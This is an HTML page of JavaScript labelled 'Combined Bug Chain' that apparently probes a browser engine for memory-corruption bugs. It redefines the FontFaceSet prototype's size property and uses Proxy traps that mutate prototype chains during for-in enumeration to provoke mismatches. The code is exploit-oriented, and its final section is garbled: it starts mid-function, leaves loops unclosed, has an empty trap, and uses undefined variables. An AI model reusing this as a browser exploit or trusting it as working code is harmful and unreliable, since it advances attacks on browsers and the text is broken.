<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        .title { color: #ff0; font-size: 18px; font-weight: bold; margin-bottom: 15px; border-bottom: 2px solid #ff0; padding-bottom: 8px; }
        .btn { padding: 15px 30px; background: #f00; border: none; color: #fff; margin: 8px; cursor: pointer; font-size: 15px; font-weight: bold; }
        .log { padding: 4px 0; font-size: 12px; }
        .success { color: #0f0; font-weight: bold; }
        .fail { color: #f00; font-weight: bold; }
        .warn { color: #ff0; font-weight: bold; }

<body>
    <h1>⚡ OPTION 3: Combined Bug Chain ⚡</h1>
    
    <div style="text-align: center; margin-bottom: 20px;">
        <button class="btn" onclick="exploit1()">Exploit 1: FontFaceSet + Enumeration</button>
        <button class="btn" onclick="exploit2()">Exploit 2: Font + Prototype Chain</button>

    </div>
    
    <div class="section">
        <div class="title">📋 Exploit Results</div>
        <div id="log"></div>

<script>
function log(msg, type) {
    var div = document.createElement('div');
    div.className = 'log ' + (type || '');
    div.textContent = msg;
    document.getElementById('log').appendChild(div);
}

function sep() {
    log('═'.repeat(80), 'info');
}

function hex(val) {
    if (typeof val === 'number') {
        return '0x' + val.toString(16);
    }
    return String(val);
}

// ============================================
// EXPLOIT 1: FONTFACESET + ENUMERATION
// ============================================
function exploit1() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('EXPLOIT 1: FontFaceSet Property Corruption + Enumeration Bug', 'critical');
    sep();
    log('', '');
    
    log('[*] Chaining two bugs together!', 'info');
    log('', '');
    
    try {
        log('[1] Creating corrupted FontFaceSet...', 'info');
        
        var fontFaceSet = document.fonts;
        
        // Make prototype configurable (our FontFaceSet bug)
        Object.defineProperty(Object.getPrototypeOf(fontFaceSet), 'size', {
            configurable: true,
            get: function() {
                log('    [!] Custom size getter called!', 'warn');
                return 0x1337;
            },
            set: function(val) {
                log('    [!] Custom size setter called with: ' + hex(val), 'warn');
            }
        });
        
        log('  ✓ FontFaceSet size property corrupted', 'success');
        log('  ✓ Size now returns: ' + hex(fontFaceSet.size), 'success');
        log('', '');
        
        // Now create prototype chain for enumeration
        log('[2] Creating enumeration confusion...', 'info');
        
        var proto = {fontProp: 'test'};
        var target = Object.create(proto);
        target.a = fontFaceSet;
        target.b = document.fonts;
        
        var proxy = new Proxy(target, {
            ownKeys: function(t) {
                log('    [!] Enumerator trap triggered', 'warn');
                
                // Modify FontFaceSet during enumeration
                try {
                    fontFaceSet.size = 0x4142;
                } catch(e) {}
                
                // Add more FontFaceSets
                for (var i = 0; i < 10; i++) {
                    t['font_' + i] = document.fonts;
                }
                
                // Modify prototype
                delete proto.fontProp;
                proto.newFontProp = fontFaceSet;
                
                log('    [!] Added FontFaceSets during enumeration', 'critical');
                
                return Reflect.ownKeys(t);
            }
        });
        
        log('  ✓ Enumeration proxy created', 'success');
        log('', '');
        
        log('[3] Triggering combined exploit...', 'info');
        
        var accessed = [];
        for (var key in proxy) {
            var val = proxy[key];
            accessed.push(key);
            
            if (val === fontFaceSet || val === document.fonts) {
                log('    Accessed FontFaceSet via: ' + key, 'info');
                log('    Size: ' + hex(val.size), 'info');
            }
        }
        
        log('', '');
        log('  ✓ Enumerated ' + accessed.length + ' properties', 'success');
        log('', '');
        
        log('[4] Checking for combined corruption...', 'info');
        
        // Try to access FontFaceSet properties that were added during enumeration
        var foundNew = 0;
        for (var i = 0; i < 10; i++) {
            var key = 'font_' + i;
            if (accessed.indexOf(key) !== -1) {
                foundNew++;
            }
        }
        
        if (foundNew > 0) {
            log('', '');
            log('✓✓✓ COMBINED BUG SUCCESS! ✓✓✓', 'critical');
            log('  FontFaceSet + Enumeration worked!', 'critical');
            log('  Found ' + foundNew + ' newly added FontFaceSets', 'critical');
        }
        
    } catch(e) {
        log('', '');
        log('ERROR: ' + e.message, 'fail');
        log('Stack: ' + e.stack, 'fail');
    }
    
    sep();
}

// ============================================
// EXPLOIT 2: FONT + PROTOTYPE CHAIN
// ============================================
function exploit2() {
    document.getElementById('log').innerHTML = '';
    sep();
    log('EXPLOIT 2: FontFace Objects in Prototype Chain', 'critical');
    sep();
    log('', '');
    
    log('[*] Using FontFace (not FontFaceSet) with prototype confusion', 'info');
    log('', '');
    
    try {
        log('[1] Creating FontFace objects...', 'info');
        
        var font1 = new FontFace('TestFont1', 'url(fake.woff2)');
        var font2 = new FontFace('TestFont2', 'url(fake2.woff2)');
        
        log('  ✓ Created FontFace objects', 'success');
        log('', '');
        
        log('[2] Building prototype chain with fonts...', 'info');
        
        var proto2 = {
            fontA: font1,
            fontB: font2
        };
        
        var proto1 = Object.create(proto2);
        proto1.x = 10;
        proto1.y = 20;
        
        var target = Object.create(proto1);
        target.a = font1;
        target.b = font2;
        
        log('  ✓ 3-level chain: target → proto1 → proto2', 'success');
        log('', '');
        
        log('[3] Creating mutation proxy...', 'info');
        
        var proxy = new Proxy(target, {
            ownKeys: function(t) {
                log('    [!] Mutating font-filled prototype chain', 'warn');
                
                // Mutate all levels with fonts
                for (var i = 0; i < 20; i++) {
                    t['tfont_' + i] = new FontFace('T' + i, 'url(t.woff2)');
                }
                
                delete proto1.y;
                for (var i = 0; i < 15; i++) {
                    proto1['p1font_' + i] = new FontFace('P1_' + i, 'url(p1.woff2)');
                }
                
                delete proto2.fontB;
                for (var i = 0; i < 10; i++) {
                    proto2['p2font_' + i] = new FontFace('P2_' + i, 'url(p2.woff2)');
                }
                
                log('    [!] Added 45 FontFace objects!', 'critical');
                
                return Reflect.ownKeys(t);
            }
        });
        
        log('  ✓ Font mutation proxy created', 'success');
        log('', '');
        
        log('[4] Triggering font enumeration...', 'info');
        
        var fontCount = 0;
        for (var key in proxy) {
            var val = proxy[key];
            if (val instanceof FontFace) {
                fontCount++;
            }
        }
        
        log('', '');
        log('  ✓ Enumerated ' + fontCount + ' FontFace objects', 'success');
        log('', '');
        
        // Check for size mismatch
        var actualFonts = 0;
        for (var key in target) {
            if (target[key] instanceof FontFace) actualFonts++;
        }
        for (var key in proto1) {
            if (proto1[key] instanceof FontFace) actualFonts++;
        }
        for (var key in proto2) {
            if (proto2[key] instanceof FontFace) actualFonts++;
        }
        
        if (fontCount !== actualFonts) {
            log('✓✓✓ FONT ENUMERATION MISMATCH! ✓✓✓', 'critical');
            log('  Expected: ' + actualFonts, 'critical');
            log('  Got: ' + fontCount, 'critical');
        }
        
    } catch(e) {
        log('', '');
        log('ERROR: ' + e.message, 'fail');
    }
    
    sep();
}

// ============================================

        log('  ✓ Created 100 victims', 'success');

        var proxy = new Proxy(target, {
            ownKeys: function(t) {
                mutations++;
                log('    [!] Mutation round ' + mutations, 'warn');
                
                // Mutate ALL levels
                for (var i = 0; i < 50; i++) {
                    t['t_' + i] = (i % 2 === 0) ? fontFaceSet : victims[i % victims.length];
                }
                
                for (var i = 0; i < 40; i++) {
                    proto1['p1_' + i] = new FontFace('M1_' + i, 'url(m1.woff2)');

                for (var i = 0; i < 30; i++) {

                    proto3['p3_' + i] = fontFaceSet;
                }
                
                log('    [!] Added 140 properties across all levels!', 'critical');
                
                return Reflect.ownKeys(t);
            },
            get: function(t, prop) {

            }
        });

        var enumerated = 0;
        var fontAccesses = 0;
        var victimAccesses = 0;
        
        for (var key in proxy) {
            enumerated++;

            if (val === fontFaceSet || val === document.fonts) {

        }

            if (victims[i][0] !== expected0 || victims[i][1] !== expected1) {
                corrupted++;
